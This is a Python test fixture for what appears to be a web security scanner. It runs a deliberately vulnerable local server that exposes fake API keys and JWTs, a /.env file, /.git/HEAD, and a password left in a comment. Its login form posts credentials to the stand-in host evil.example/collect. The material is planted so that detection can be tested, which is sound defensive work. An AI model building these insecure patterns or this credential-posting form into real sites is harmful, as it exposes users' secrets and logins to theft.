import base64
import json
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

# Jetons factices assemblés à l'exécution : aucun motif complet dans le dépôt.
def b64(o):
    return base64.urlsafe_b64encode(json.dumps(o).encode()).decode().rstrip("=")

AWS = "AK" + "IA" + "Q3EGRTZ7LWBN4XKD"
GKEY = "AI" + "za" + "SyD4x9Kq2LmN7pQr5StU8vWx0YzA1bC3dEf"
SK = "sk_" + "live_" + "Z9y8X7w6" * 3
PK = "pk_" + "live_" + "A1b2C3d4" * 3
SERVICE_ROLE = b64({"alg": "HS256", "typ": "JWT"}) + "." + b64({"iss": "supabase", "role": "service_role"}) + "." + "s1gNaTuRe" * 3

PAGE = ("""<!doctype html><html><head><title>Fixture vuln</title>
<meta name="generator" content="WordPress 5.2.1">
<script src="https://code.jquery.com/jquery-1.12.4.min.js"></script>
<script src="/static/app.js"></script>
</head><body>
<!-- TODO: retirer le password admin: hunter2 -->
<h1>Connexion</h1>
<form action="http://evil.example/collect" method="post">
<input name="u"><input type="password" name="p"><button onclick="void 0">OK</button></form>
<p>Contact : admin@exemple.fr</p>
<img src="http://example.com/x.png">
<script>localStorage.setItem('access_token','eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjMifQ.abc')</script>
<script>
window.cfg = { aws: "%s", maps: "%s", apiSecret: "q7Wm3pLx9Rt2Vz8Nk4" };
fetch('/api/users/123?token=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.sig&page=2');
fetch('/api/users/456', { headers: { Authorization: 'Bearer abcdef' } });
fetch('/api/orders', { method: 'POST', body: '{}', headers: { 'Content-Type': 'application/json', Authorization: 'Basic dTpw' } });
fetch('/api/fail');
</script>
</body></html>""" % (AWS, GKEY)).encode()
APP_JS = ("""// bundle de démonstration
var stripe = Stripe("%s");
var admin = "%s";
var supa = createClient("https://x.supabase.co", "%s");
""" % (PK, SK, SERVICE_ROLE)).encode()
SPEC = json.dumps({"openapi": "3.0.1", "info": {"title": "Fixture API"}, "paths": {
    "/api/users/{id}": {"get": {"summary": "Un utilisateur"}},
    "/api/orders": {"get": {"summary": "Commandes"}, "post": {"summary": "Créer une commande"}},
}}).encode()
class H(BaseHTTPRequestHandler):
    def json(self, code, body=b'{"ok":true}'):
        self.send_response(code);self.send_header("Content-Type","application/json");self.end_headers();self.wfile.write(body)
    def do_POST(self):
        self.rfile.read(int(self.headers.get("Content-Length") or 0))
        self.json(201)
    def do_GET(self):
        p=self.path
        if p=="/.git/HEAD": self.send_response(200);self.end_headers();self.wfile.write(b"ref: refs/heads/main\n");return
        if p=="/.env": self.send_response(200);self.end_headers();self.wfile.write(b"DB_PASSWORD=s3cret\nAPI_KEY=abcdef\n");return
        if p.startswith("/.well-known/") or p in ("/server-status","/phpinfo.php","/.DS_Store","/.svn/entries","/.git/config"):
            self.send_response(404);self.end_headers();return
        if p=="/robots.txt": self.send_response(200);self.end_headers();self.wfile.write(b"User-agent: *\nDisallow:\n");return
        if p=="/openapi.json": return self.json(200, SPEC)
        if p=="/static/app.js":
            self.send_response(200);self.send_header("Content-Type","text/javascript");self.end_headers();self.wfile.write(APP_JS);return
        if p=="/api/fail": return self.json(500, b'{"error":"boom"}')
        if p.startswith("/api/"): return self.json(200)
        # Toute autre adresse répond 200 en HTML : les sondes doivent confirmer par le contenu.
        self.send_response(200)
        self.send_header("Content-Type","text/html; charset=utf-8")
        self.send_header("Set-Cookie","PHPSESSID=abc; Path=/")
        self.end_headers();self.wfile.write(PAGE)
    def log_message(self,*a): pass
ThreadingHTTPServer(("127.0.0.1",8766),H).serve_forever()
